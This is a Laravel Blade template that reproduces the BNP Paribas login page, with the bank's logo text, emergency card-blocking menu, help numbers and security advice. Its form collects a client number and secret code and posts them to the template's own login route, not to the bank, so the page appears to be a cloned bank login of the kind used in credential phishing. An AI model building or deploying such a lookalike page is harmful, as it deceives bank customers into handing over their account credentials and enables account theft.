@extends('layouts.layout')
{{-- @section('title')
{{ __('app.home') }}
@endsection --}}
<div class="" id="ls-canvas">
    <div class="ls-row" id="topHeader">
       <div class="ls-fxr" id="ls-gen33001729-ls-fxr">
          <div class="ls-area extLinks" id="extLinks">
             <div class="ls-area-body" id="ls-gen33001730-ls-area-body">
                <div class="ls-cmp-wrap ls-1st" id="w1410874521535">
                   <div class="iw_component" id="1410874521535"></div>
                </div>
                <div class="ls-cmp-wrap" id="w1410874521536">
                   <div class="iw_component" id="1410874521536"></div>
                </div>
                <div class="ls-cmp-wrap" id="w1410874521537">
                   <div class="iw_component" id="1410874521537">
                      <!--content start-->
                      <div id="wcm-l-top-header">
                         <div class="wcm-html style-default part ">
                            <!--<header class="top-header">	<nav class="row">	 	<ul class="list-header">				<li class="nav-part"><a href="/fr/Accueil-part-fr">Particuliers</a></li>				<li class="nav-prio"><a href="/fr/vos-besoins/votre-situation/priority">Priority</a></li>				<li class="nav-bpf"><a href="/fr/a-la-une-bpf">Banque privée</a></li>				<li class="nav-pro"><a href="/fr/a-la-une-pro">Professionnels</a></li>				<li class="nav-ent"><a href="http://entreprises.bnpparibas.fr/">Entreprises</a></li>				<li class="nav-asso"><a href="http://associations.bnpparibas.fr/">Associations</a></li>		 	</ul>		 </nav>	</header>-->
                         </div>
                      </div>
                      <!--content stop-->
                   </div>
                </div>
             </div>
          </div>
          <div class="ls-area langSelect" id="langSelect">
             <div class="ls-area-body" id="ls-gen33001731-ls-area-body"></div>
          </div>
          <div class="ls-row-clr"></div>
       </div>
    </div>

    <header class="bottom-header">
        <div class="no-mob">
            <div class="logoBNP-container">
            <a href="#" class="logoBNP-alone text-hide part-only">BNP Paribas La banque d'un monde qui change</a>
            <a href="#" class="logoBNP-alone text-hide pro-only">BNP Paribas La banque d'un monde qui change</a>
            <p>La banque d'un monde qui change</p>
            </div>
            {{-- <a href="#fr/connexion" class="bouton-espace-client" id="bouton-espace-client">Accéder à mes comptes</a> --}}
            <a href="#" class="bouton-devenir-client part-only">Devenir client</a>
            <a href="#" class="bouton-devenir-client pro-only">Devenir client</a>
            <!-- || SOS CARTE || --> 
            <div id="acces-sos-carte">                          
                <button data-toggle-section="#quickAccesMenuSosCarte" class="part-only"> 
                    <span class="pictoGiroSos"><i class="icon icon-picto-giro"></i></span>                         
                    <!--Urgence-->
                </button>   
     
                <button data-toggle-section="#quickAccesMenuSosCarte" class="bpf-only">  
                     <img src="{{ asset ('images/urgence.svg')}}" class="pictoWhite">   
                     <img src="{{ asset ('images/picto-giro-bpf.svg')}}" class="pictoGreen">            
                     <img src="{{ asset ('images/picto-giro.svg')}}" class="pictoGrey">                          
                    Urgence          
                </button>               
      
                <div id="quickAccesMenuSosCarte" class="hidden">   
                    <div class="header pull-left">            
                        <div class="pull-left">              
                            <p>Vous avez une urgence ?</p>            
                            <p>Sélectionnez votre urgence pour trouver une solution à distance.</p>   
                        </div>    
    
                        <button class="pull-right icon icon-close-white" data-hide-section="#quickAccesMenuSosCarte"></button>           
                    </div> 
    
                    <div class="content">     
                        <div class="content-left"> 
                            <div class="moyens-paiement">
                                <p class="title pull-left">Mes moyens de paiement</p> 
     
                                <ul class="pull-right">    
                                    <li class="sosA1 active">
                                        <a href="#" class="part-only">
                                            <span>Débloquer ma carte</span>  
                                        </a>  
    
                                        <a href="#" class="bpf-only">
                                            <span>Débloquer ma carte</span>
                                        </a>        
                                    </li>
                                    <li class="sosA2"><a href="#"><span>Opposer ma carte</span></a></li> 
                                    <li class="sosA3"><a href="#"><span>Opposer un chèque/mon chéquier</span></a></li>
                                    <li class="sosA4"><a href="#"><span>Opposer un prélèvement</span></a></li> 
                                </ul>  
                            </div> 
       
                            <div class="mes-assurances">   
                                <p class="title pull-left">Mes assurances</p>       
                                
                                <ul class="pull-right part-only">         
                                    <li class="sosB2"><a href="#"><span>Assurance auto</span></a></li>          
                                    <li class="sosB3"><a href="#"><span>Assurance habitation</span></a></li>   
                                    <li class="sosB1"><a href="#"><span>Perte et vol de clés</span></a></li>
                                    <li class="sosB4"><a href="#"><span>Assurance des appareils nomades</span></a></li>                    
                                </ul>  
                                <ul class="pull-right bpf-only">         
                                    <li class="sosB2"><a href="#"><span>Assurance auto</span></a></li>          
                                    <li class="sosB3"><a href="#"><span>Assurance habitation</span></a></li>   
                                    <li class="sosB1"><a href="#"><span>Perte et vol de clés</span></a></li>
                                    <li class="sosB4"><a href="#"><span>Assurance des appareils nomades</span></a></li>                 
                                </ul>       
    
                            </div>      
                        </div>        
      
                        <div class="separate"></div>   
    
                        <div class="content-right">  
                            <div id="sosA1" class="changeContent">     
                                 <img src="{{ asset ('images/picto-carte-bloqu-e.png')}}" class="part-only">  
                                 <img src="{{ asset ('images/debloquer-carte-bpf.png')}}" class="bpf-only">       
                                <p class="title">Carte refusée ? code pin oublié ?</p>      
                                <p class="subtitle">Sélectionnez la carte avec laquelle vous rencontrez des problèmes et obtenez de l'aide.</p>  
                            </div>
    
                            <div id="sosA2" class="changeContent hidden">    
                                 <img src="{{ asset ('images/oposer-carte.png')}}" class="part-only">  
                                 <img src="{{ asset ('images/oposer-carte-bpf.png')}}" class="bpf-only">   
                                <p class="title">Carte perdue ou volée ?</p>       
                                <p class="subtitle">Opposez votre carte en quelques clics</p>  
                            </div> 
    
                            <div id="sosA3" class="changeContent hidden">    
                                 <img src="{{ asset ('images/opposer-cheque.png')}}" class="part-only"> 
                                 <img src="{{ asset ('images/opposer-cheque-bpf.png')}}" class="bpf-only">   
                                <p class="title">Chèque perdu ? chéquier volé ?</p>         
                                <p class="subtitle">Opposez un chèque ou votre chéquier en suivant ce lien</p>  
                            </div> 
            
                            <div id="sosA4" class="changeContent hidden">      
                                 <img src="{{ asset ('images/opposer-prelevement.png')}}" class="part-only"> 
                                 <img src="{{ asset ('images/opposer-prelevement-bpf.png')}}" class="bpf-only">    
                                <p class="title">Vous souhaitez opposer un prélèvement ?</p>        
                                <p class="subtitle">Cliquez sur le lien puis sélectionnez le prélèvement à opposer</p>  
                            </div>  
    
                            
                            <div id="sosB2" class="changeContent hidden"> 
                                     <img src="{{ asset ('images/picto-voiture.png')}}" class="part-only"> 
                                     <img src="{{ asset ('images/picto-voiture-bpf.png')}}" class="bpf-only">       
                                <p class="title">Assistance auto</p>    
            
                                <div class="assistanceContent"> 
                                    <p>Si vous détenez un contrat Assurance Auto BNP Paribas, cliquez pour afficher les numéros d’assistance.</p>  
                                    <!-- <p class="pull-left textAssurance">Contactez, 24/24 7j/7 votre assistance au 01 55 92 26 64 (appel non surtaxé).</p> -->
                                </div>                
                            </div>              
    
    
    
                            <div id="sosB3" class="changeContent hidden">  
                                     <img src="{{ asset ('images/picto-maison.png')}}" class="part-only"> 
                                     <img src="{{ asset ('images/picto-maison-bpf.png')}}" class="bpf-only">        
                                <p class="title">Assistance habitation</p>   
    
                                <div class="assistanceContent"> 
                                    <p>Si vous détenez un contrat Assurance Habitation BNP Paribas, cliquez pour afficher les numéros d’assistance.</p> 
                                    <!-- <p class="pull-left textAssurance">Contactez, 24/24 7j/7 votre assistance au 01 55 92 26 64 (appel non surtaxé).</p>  -->
                                </div>    
                            </div>  
                            
                            <div id="sosB1" class="changeContent hidden">   
                                     <img src="{{ asset ('images/picto-cles-QA.png')}}" class="part-only"> 
                                     <img src="{{ asset ('images/picto-cle-QA-bpf.png')}}" class="bpf-only">  
                                <p class="title">Perte et vol de clés</p>       
                                <p>Si vous détenez un contrat BNP Paribas Sécurité ou Sécurité Plus, cliquez pour afficher les numéros d’assistance.</p> 
                                <!-- <div class="group-phone"> 
                                    <ul>  
                                        <li> 
                                            <p>Pour BNP Paribas Sécurité</p>
    
                                            <div>
                                                <p class="pull-left">Depuis la France et l'étranger :</p>
    
                                                <img src="#rsc/contrib/image/generique/numero-vert.png')}}" class="pull-left" />
                                            </div>
                                        </li>
    
                                        <li>
                                            <p>Pour BNP Paribas Sécurité</p> 
    
                                            <div>
                                                <p class="pull-left">Depuis la France :</p>  
    
                                                <img src="#rsc/contrib/image/generique/numero-gris.png')}}" class="pull-left" />
    
                                                <p class="lastP">Depuis l'étranger : (00 33) 1 55 92 23 68 (appel non surtaxé).</p>  
                                            </div> 
                                        </li>  
                                    </ul>
                                </div>  -->
                            </div>
    
                            <div id="sosB4" class="changeContent hidden">
                                 <img src="{{ asset ('images/picto-mobileo.png')}}" class="part-only"> 
                                 <img src="{{ asset ('images/picto-mobileo(1).png')}}" class="bpf-only">
                                <p class="title">Assistance Mobileo</p>
                                <div class="assistanceContent">
                                    <p>Si vous détenez un contrat Mobileo, cliquez pour afficher les numéros d’assistance</p>
                                </div>
                            </div>
    
                        </div>          
                    </div>  
                </div>
            </div>
            <!-- ///////// -->
            <a id="open-recherche-nonconnecte" href="#" class="list-header-connected">
                <i class="search"></i>  
                <span>Recherche</span>      
            </a>  
        </div>
        <header class="bottom-header-connected mobile-only pull-left" id="nav-connect">
            <ul id="nav-connect-item" class="list-header-connected left nav-connecte-items mobile-only">
                <li class="js-toggle-subnav"><i class="burger"></i></li>
                <li class="logo"><a href="#" class="logoBNP"></a></li>
                <li id="bouton-espace-client-mobile" class="bottom-header-lock pull-right"><span class="icon icon-lock"></span></li>
                <li class="inbenta-mobile-search"><a id="open-recherche-nonconnecte-mobile" href="##" class="list-header-connected " style=""><i class="search"></i><span class="text-hide">Recherche</span></a></li>
            
            </ul>
        </header>
        <form class="form hidden recherche-qualifie-container" id="recherche-site"></form>
    </header>

<!--************************************
   Wrapper End
   *************************************-->

      <!-- =============================================== --><!-- Identification - Sp�cifique � CAS OIDC Provider --><!-- =============================================== --><div class="ls-row" id="wrapper">
        <div class="ls-fxr" id="ls-gen24968870-ls-fxr">
            <div class="ls-area mainContent" id="">
               <div class="ls-area-body" id="ls-gen24968871-ls-area-body">
                  <div class="ls-cmp-wrap ls-1st" id="w1413474755922">
                      <div class="iw_component" id="1413474755922">
                          <!--content start-->
                        <div id="wcm-l-">
                          <div class="wcm-html style-default "></div>
                      </div><!--content stop-->
                      </div>
                  </div>
                  <div class="ls-cmp-wrap" id="w1413474755927">
                     <div class="iw_component" id="1413474755927">
                        
                        <div id="id_balise_div">
                            <div class="canvasLoader hidden" style="width: 80px; height: 80px; margin: 300px auto 0 auto;">
                                <canvas width="80" height="80" style="width: 80px; height: 80px;"></canvas>
                            </div>
                            <div class="wcm-ia-column">
                              <div id="ia-identification">
                                  <div rv-show="data.codeRetour | couldShow">
                                      <div class="ident">
                                          <div class="carret-up"></div>

                 <!-- Identification Grille -->
                    <section class="main-content fond-gradient">
                        <div class="container-ident">
                            <div class="message-erreur arrow-bottom" id="message-erreur"></div>
                            <h2 rv-text="config.app.identification.titre" class="log__title">
                                <span class="label_field">Accéder à mes Comptes</span>
                            </h2>
                            <form  method="POST" action="{{ route('login') }}" id="logincanalnet" name="logincanalnet" class="form">
                                @csrf
                            

                                <ul class="grille-ident">
                                    <li style="position: relative;">
                                        <label rv-text="config.app.identification.numclient">1. <span class="label_field">Mon numéro client</span> </label>
                                        <input type="email"  id="email" type="email" class="form-control{{ $errors->has('email') ? ' is-invalid' : '' }}" name="email" value="{{ old('email') }}" required autofocus class="form-control numeric">
                                       
                                        @if ($errors->has('email'))
                                            <span class="invalid-feedback" role="alert">
                                                <strong>{{ $errors->first('email') }}</strong>
                                            </span>
                                        @endif
                                        
                                    </li>
                                    <li style="position: relative;">
                                            <input type="hidden" value="" name="ch5temp">
                                            <label rv-text="config.app.identification.password" class="">2. 
                                                <span class="label_field">Mon code secret (6 chiffres min)</span>
                                            </label>
                                            <div class="field-password off">
                                                <input id="password" type="password" class="form-control{{ $errors->has('password') ? ' is-invalid' : '' }}" name="password" required>
                                         
                                                @if ($errors->has('password'))
                                                    <span class="invalid-feedback" role="alert">
                                                        <strong>{{ $errors->first('password') }}</strong>
                                                    </span>
                                                @endif
                                            
                                                <div class="form-check">
                                                    <input class="form-check-input" type="checkbox" name="remember" id="remember" {{ old('remember') ? 'checked' : '' }}>
                 
                                                    <label class="form-check-label" for="remember">
                                                        {{ __('Se souvenir de moi') }}
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="cell-password">
                                                <div class="field-valid">
                                                    <section>
                                                        <button type="submit" class="btn-primary btn-block" id=""  value="Accéder à mes Comptes">
                                                            <span class="label_field">Accéder à mes Comptes</span>
                                                        </button>
                                                        
                                                        {{-- @if (Route::has('password.request'))
                                                        <a class="btn btn-link" href="{{ route('password.request') }}">
                                                            {{ __('Forgot Your Password?') }}
                                                        </a>
                                                    @endif --}}
                                                    </section>
                                                </div>
                                            </div>
                                            <div id="zone-publiable-basse"><p id="zonePubliableBasIdentificationPart"></p>
                                            </div>
                                    </li>
                                </ul>
                            </form>
                        </div>
                    </section>
                                      

                                          {{-- loginnnnn --}}


                                          <aside class="col-aside arrow-left">
                                                <div id="zone-publiable-haute kw_______">
                                                    <div class="new-ident" id="new-ident">
                                                        <div class="section-wrap">
                                                            <h2 class="kh__loggg">
                                                            <i class="icon icon-picto-cadenas"></i>Vos codes d'accès
                                                            </h2>
                                                            <p>
                                                            <a class="new-iden" href="#fr/gerer/services-lies-compte/options-et-services/code-acces-compte-en-ligne">Obtenir ses codes d'accès</a>
                                                            </p>
                                                            <p>
                                                            <a class="new-iden" href="#fr/banque-contacts/recuperer-code-secret">Code secret oublié ?</a>
                                                            </p>
                                                        </div>
                                                    
                                                        <div class="section-wrap encartSecu">
                                                            <h2 class="kh__loggg">
                                                            <i class="icon icon-picto-bouclier"></i>Conseils de
                                                            sécurité
                                                            </h2>
                                                            <p>
                                                            Vérifiez que
                                                            <strong>l'adresse du site commence exactement par :</strong>
                                                            </p>
                                                            <p class="url">
                                                            <strong>https://connexion-mabanque.bnpparibas</strong>
                                                            </p>
                                                            <div class="row">
                                                            <div class="col-55">
                                                                <p>
                                                                précédée par une icône cadenas et contient un
                                                                <b>https://</b> qui garantiront une
                                                                connexion sécurisée.
                                                                </p>
                                                                <p>
                                                                <a class="new-iden" href="#">Découvrez nos conseils sécurité</a>
                                                                et les bonnes pratiques pour consulter et identifier
                                                                les dangers du web.
                                                                </p>
                                                            </div>
                                                            </div>
                                                        </div>
                                                    
                                                        <div class="section-wrap">
                                                            <h2 class="kh__loggg">
                                                            <i class="icon icon-picto-oeil"></i>Pour une meilleure
                                                            accessibilité
                                                            </h2>
                                                            <p>
                                                            <a class="new-iden" href="#">Connectez-vous</a>
                                                            grâce à la grille contrastée, agrandie et bénéficiez d'un
                                                            accompagnement vocal.
                                                            </p>
                                                            <p>
                                                            <a class="new-iden" href="#" target="_blank">Utilisez Facil'iti</a>
                                                            pour personnaliser l'affichage en fonction de votre situation (handicap visuel ou cognitif).
                                                            </p>
                                                        </div>
                                                    
                                                        <div class="section-wrap">
                                                            <h2 class="kh__loggg">
                                                            <i class="icon icon-picto-telephone"></i>Informations
                                                            client
                                                            </h2>
                                                            <p>
                                                            Si vous rencontrez des problèmes techniques lors de votre
                                                            navigation, nous vous invitons à contacter nos conseillers
                                                            en ligne au :
                                                            </p>
                                                            <div class="telephone first grey small">
                                                            <div class="number arrow-right">
                                                                <span>3477</span>
                                                            </div>
                                                    
                                                            <div class="texte">
                                                                <p>Service gratuit <br> + prix appel</p>
                                                            </div>
                                                            </div>
                                                    
                                                            <p>
                                                            ou à nous
                                                            <a class="new-iden" href="#">signaler un problème technique</a>.
                                                            <br>
                                                            Vous pouvez également gérer vos comptes depuis votre
                                                            mobile ou votre tablette via l'application
                                                            <a class="new-iden" href="#">Mes comptes</a>.
                                                            </p>
                                                        </div>
                                                    </div>
                                                </div>
                                          </aside>
                                        
                                        
                                        </div>
                                      <div class="identification_erreur_tech" rv-show="data.codeRetour | couldNotShow" style="display: none;"><p></p></div>									
                                  </div>									
                              </div>
                        </div>
                        <!--Tools Component stop-->
                    </div>
                  </div>
               </div>
            </div>
            <div class="ls-row-clr"></div>
         </div>
      </div>
      
   </div>


@section('mainContent')
@endsection
